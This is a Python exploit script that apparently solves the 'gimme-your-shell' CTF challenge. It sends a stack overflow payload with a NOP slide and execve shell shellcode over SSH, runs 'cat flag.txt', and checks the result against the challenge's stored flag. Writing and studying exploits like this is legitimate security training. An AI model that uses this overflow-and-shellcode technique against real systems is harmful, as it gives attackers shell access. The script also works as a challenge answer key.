from struct import pack
import os
from pwn import *
import subprocess

if os.getenv("DEV") == "1":
    host = "localhost"
else:
    host = "gimme-your-shell.ctf.insecurity-insa.fr"

keyfile = "keys/id_rsa"

shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
nopslide = b'\x90'*500
p = b"AAAABBBBCCCCAAAABBBBCCCC"
p += p64(0x7fffffffecc0+200)
p += nopslide
p += shellcode
p += b"\x0A"

with open("/tmp/exp", "wb") as f:
    f.write(p)

out = subprocess.check_output([f"(cat /tmp/exp ; sleep 5;echo 'cat flag.txt') | ssh -oStrictHostKeyChecking=no -p 2225 -i keys/id_rsa user@{host}"], shell=True).decode()
flag = out.split("\n")[-2]

print("FLAG found =", flag)

import re
actual_flag = re.findall(r'INSA{.*}', open('../.mkctf.yml').read())[0]
assert actual_flag in flag
